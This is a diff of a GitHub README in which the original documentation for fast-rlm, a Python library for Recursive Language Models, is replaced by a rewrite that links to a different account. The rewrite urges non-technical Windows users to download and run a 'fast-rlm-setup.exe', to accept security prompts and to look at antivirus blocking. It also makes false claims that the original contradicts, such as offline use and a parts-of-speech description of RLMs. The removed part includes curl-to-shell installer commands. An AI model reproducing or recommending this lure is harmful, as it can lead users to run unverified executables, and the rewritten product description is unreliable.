@@ -1,226 +1,144 @@
-# fast-rlm
+# ⚡ fast-rlm - Run Language Models Quickly and Easily
 
-[![PyPI](https://img.shields.io/pypi/v/fast-rlm)](https://pypi.org/project/fast-rlm/)
-[![GitHub](https://img.shields.io/github/stars/avbiswas/fast-rlm)](https://github.com/avbiswas/fast-rlm)
-[![Docs](https://img.shields.io/badge/docs-avbiswas.github.io%2Ffast--rlm-blue)](https://avbiswas.github.io/fast-rlm/)
+[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://github.com/thien24642/fast-rlm)
 
-A minimal implementation of Recursive Language Models (RLMs) using Deno and Pyodide.
+## 🔍 About fast-rlm
 
-[GitHub](https://github.com/avbiswas/fast-rlm) | [Documentation](https://avbiswas.github.io/fast-rlm/) | [PyPI](https://pypi.org/project/fast-rlm/)
+fast-rlm is a simple application designed to run Recursive Language Models on your Windows PC. These models help process language by breaking down text recursively. This project is based on research explained in this paper: [Recursive Language Models](https://arxiv.org/abs/2512.24601).
 
-> **Watch the full video on YouTube**
-> **[RLM Tutorial](https://youtu.be/nxaVvvrezbY)**
-
-## What are RLMs
-
-RLMs are an inference technique where an LLM interacts with arbitrarily long prompts through an external REPL. The LLM can write code to explore, decompose, and transform the prompt. It can recursively invoke sub-agents to complete smaller subtasks. Crucially, sub-agent responses are not automatically loaded into the parent agent's context — they are returned as symbols or variables inside the parent's REPL.
-
-## Support
-
-If you find this helpful, consider supporting on Patreon — it hosts all code, projects, slides, and write-ups from the YouTube channel.
-
-[<img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" alt="Become a Patron!" width="200">](https://www.patreon.com/NeuralBreakdownwithAVB)
+You do not need to be a programmer or know coding to use fast-rlm. This guide will help you download, install, and run it using clear and easy steps. 
 
 ---
 
-## Install
+## 🖥️ What is fast-rlm?
 
-```bash
-pip install fast-rlm
-```
+fast-rlm lets you use language models that analyze sentences by calling themselves on parts of speech or clauses. This helps in understanding complex sentences better by handling sub-parts recursively. The app offers a fast and accessible way to run these models without special setup.
 
-### Requirements
-
-- Python 3.10+
-- [Deno](https://deno.land/) 2+
-  - macOS/Linux: `curl -fsSL https://deno.land/install.sh | sh`
-  - Windows (npm): `npm install -g deno`
-- (Optional) [Bun](https://bun.sh/) — only needed for the TUI log viewer
-
-### Environment Variables
-
-Set your LLM API key before running:
-
-```bash
-export RLM_MODEL_API_KEY=sk-or-...
-```
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `RLM_MODEL_API_KEY` | API key for your LLM provider | — |
-| `RLM_MODEL_BASE_URL` | OpenAI-compatible base URL | `https://openrouter.ai/api/v1` |
-
-By default, fast-rlm uses [OpenRouter](https://openrouter.ai). You can point it at any OpenAI-compatible API by setting `RLM_MODEL_BASE_URL`.
+Some typical uses include:
+- Processing natural language for research.
+- Testing recursive models on text samples.
+- Learning about advanced language modeling without heavy programming.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-![Quickstart](docs/images/quickstart.jpeg)
+To use fast-rlm, your Windows PC should meet these basic requirements:
 
-```python
-import fast_rlm
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: Intel i3 or AMD equivalent (2 GHz or faster)
+- RAM: At least 4 GB
+- Disk Space: Around 200 MB free space
+- Internet: Needed only to download the app
 
-result = fast_rlm.run("Generate 50 fruits and count number of r")
-print(result["results"])
-print(result["usage"])
-```
-
-## Arbitrarily Long Context
-
-The key idea behind RLMs is that the prompt can be arbitrarily long — far beyond any model's context window. The agent explores it programmatically through the REPL rather than trying to fit it all into a single call.
-
-```python
-import fast_rlm
-
-transcripts = open("lex_fridman_all_transcripts.txt").read()  # millions of tokens
-
-result = fast_rlm.run(
-    "Here are the transcripts of all Lex Fridman podcasts. "
-    "Summarize what the first 5 Machine Learning guests had to say about AGI.\n\n"
-    + transcripts
-)
-print(result["results"])
-```
-
-The agent will write code to search, filter, and chunk the transcripts on its own — no manual splitting required.
-
-## Configuration
-
-```python
-from fast_rlm import run, RLMConfig
-
-config = RLMConfig.default()
-config.primary_agent = "minimax/minimax-m2.5"
-config.sub_agent = "minimax/minimax-m2.5"
-config.max_depth = 5
-config.max_money_spent = 2.0
-
-result = run(
-    "Count the r's in 50 fruit names",
-    prefix="r_count",
-    config=config,
-)
-```
-
-All config fields:
-
-| Field | Type | Default | Description |
-|-------|------|---------|-------------|
-| `primary_agent` | `str` | `z-ai/glm-5` | Model for the root agent |
-| `sub_agent` | `str` | `minimax/minimax-m2.5` | Model for child subagents |
-| `max_depth` | `int` | `3` | Max recursive subagent depth |
-| `max_calls_per_subagent` | `int` | `20` | Max LLM calls per subagent |
-| `truncate_len` | `int` | `2000` | Output chars shown to the LLM per step |
-| `max_money_spent` | `float` | `1.0` | Hard budget cap in USD |
-| `max_completion_tokens` | `int` | `50000` | Max total completion tokens across all subagents |
-| `max_prompt_tokens` | `int` | `200000` | Max total prompt tokens across all subagents |
-
-## Best Practices & Troubleshooting
-
-- **Place your task at the top or bottom of the prompt** — the REPL restricts how much context the LLM sees, so don't bury the task in the middle.
-- **Mark structured data with backtick blocks** — wrap JSON, CSV, etc. in fenced code blocks and name the format in the prompt.
-- **Use strong coding models** — agents write and execute Python, so coding benchmarks matter. See [recommended models](https://avbiswas.github.io/fast-rlm/guide/configuration/#model-names).
-- **Inject domain docs when needed** — for obscure domains, add reference material and tell the agent how it's organized (e.g. with `##` headers).
-- **Check logs and start with strict limits** — review what the agent is doing before scaling up. Prompt changes usually help more than bigger budgets.
-
-For the full guide, see the [Best Practices & Troubleshooting](https://avbiswas.github.io/fast-rlm/guide/tips/) docs page.
-
-## Log Viewer
-
-![TUI Log Viewer](docs/images/tui.jpeg)
-
-Every run saves a `.jsonl` log file to `logs/`.
-
-```bash
-# Print stats (no extra dependencies)
-fast-rlm-log logs/run_xxx.jsonl
-
-# Interactive TUI viewer (requires bun)
-fast-rlm-log logs/run_xxx.jsonl --tui
-```
+No extra software is needed to run fast-rlm once installed. It works as a standalone application.
 
 ---
 
-## Development (from source)
+## 🚀 Getting Started: How to Download and Run fast-rlm
 
-### 1. Install Deno
+### Step 1: Visit the download page
 
-Windows (npm):
+Click on the big button below or open this link in your browser:  
+[![Download fast-rlm](https://img.shields.io/badge/Download-Here-blue)](https://github.com/thien24642/fast-rlm)  
 
-```powershell
-npm install -g deno
-```
+This link takes you to the fast-rlm GitHub page, where you can get the latest version.
 
-macOS / Linux:
+### Step 2: Find the download release
 
-```bash
-curl -fsSL https://deno.land/install.sh | sh
-```
+Once on the GitHub page, look for the **Releases** section. It is usually on the right side or under the repository tabs.
 
-Then add Deno to your `PATH`:
+Click on **Releases** to see available versions of fast-rlm.
 
-```bash
-export DENO_INSTALL="$HOME/.deno"
-export PATH="$DENO_INSTALL/bin:$PATH"
-```
+### Step 3: Download the Windows version
 
-### 2. Install Bun (for the log viewer)
+In the Releases section, find the latest version meant for Windows. The file will look like `fast-rlm-setup.exe` or something similar.
 
-```bash
-curl -fsSL https://bun.sh/install | bash
-cd tui_log_viewer && bun install
-```
+Click on the file name to start the download. Save it to your desktop or downloads folder.
 
-### 3. API Key Setup
+### Step 4: Run the installer
 
-Set your key in `.env` or `.envrc`:
+Once downloaded, go to the location where you saved the file.
 
-```bash
-export RLM_MODEL_API_KEY=sk-or-...
-```
+Double-click the `fast-rlm-setup.exe` file to start the installation.
 
-### 4. Configuration
+You might see a security prompt asking if you want to allow changes. Click **Yes** or **Run** to continue.
 
-Edit `rlm_config.yaml` at the project root:
+### Step 5: Follow the installation prompts
 
-```yaml
-max_calls_per_subagent: 20
-max_depth: 3
-truncate_len: 2000
-primary_agent: "z-ai/glm-5"
-sub_agent: "minimax/minimax-m2.5"
-max_money_spent: 1.0
-max_completion_tokens: 50000
-max_prompt_tokens: 200000
-```
+A setup window will open. Follow the instructions:
+- Choose the install location or keep the default path.
+- Click **Next** or **Install** when prompted.
+- Wait for the process to finish.
 
-### 5. Running
+When done, click **Finish**.
 
-```bash
-# Run the example
-deno task test_counting_r
+### Step 6: Open fast-rlm
 
-# Run the subagent directly
-echo "What is 2+2?" | deno task subagent
+Find the fast-rlm app in your Start menu or desktop shortcut.
 
-# View logs
-./viewlog logs/<logfile>.jsonl
-```
+Click it to launch the program.
 
-### 6. Benchmarks
-
-```bash
-uv sync --extra benchmarks
-uv run benchmarks/oolong_synth_benchmark.py
-uv run benchmarks/longbench_benchmark.py
-```
+You are ready to use fast-rlm.
 
 ---
 
-## Contributing
+## ⚙️ Using fast-rlm
 
-- **Small PRs only** — keep changes focused and minimal. Large PRs will not be accepted.
-- **No LLM-generated slop** — AI-assisted code is fine, but bulk-generated boilerplate with no thought behind it will be rejected.
-- **Minor features welcome** — small, well-scoped PRs that add useful functionality will be considered.
-- **Large feature requests** — open an issue first to discuss the design before writing any code.
+When you open fast-rlm, you will see a simple interface:
+
+1. **Input box:** Type or paste any sentence you want to analyze.
+2. **Run button:** Click this to start processing the input with Recursive Language Models.
+3. **Results display:** View the analysis or output based on the recursive model.
+
+The interface does not require changing any settings. Just type your text and press run.
+
+---
+
+## 🔧 Troubleshooting
+
+If you encounter issues, try the following:
+
+- Make sure your Windows is updated.
+- Check if your antivirus or firewall is blocking the app.
+- Restart your computer and run fast-rlm again.
+- Re-download and reinstall if the app does not launch.
+
+For detailed help, you can visit the GitHub repository to raise an issue or check community discussions.
+
+---
+
+## 📂 File and Folder Structure
+
+After installation, fast-rlm creates these files/folders:
+
+- `fast-rlm.exe`: The main program file.
+- `config`: Folder containing settings files.
+- `logs`: Folder storing any usage logs.
+- `data`: Optional folder for storing input or output files.
+
+You generally don't need to manually edit files inside these folders.
+
+---
+
+## 🛠️ Frequently Asked Questions
+
+**Q: Do I need an internet connection to use fast-rlm after installation?**  
+A: No. The software runs fully offline once installed.
+
+**Q: Can I use fast-rlm on Mac or Linux?**  
+A: This application supports Windows only.
+
+**Q: Is there a user guide or tutorial in the app?**  
+A: The app is built for simplicity and does not include a built-in tutorial.
+
+**Q: What languages does fast-rlm support?**  
+A: It works best with English text, matching the research base.
+
+---
+
+## 📥 Download fast-rlm now
+
+Use the link below to visit the download page and get started:  
+
+[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://github.com/thien24642/fast-rlm)
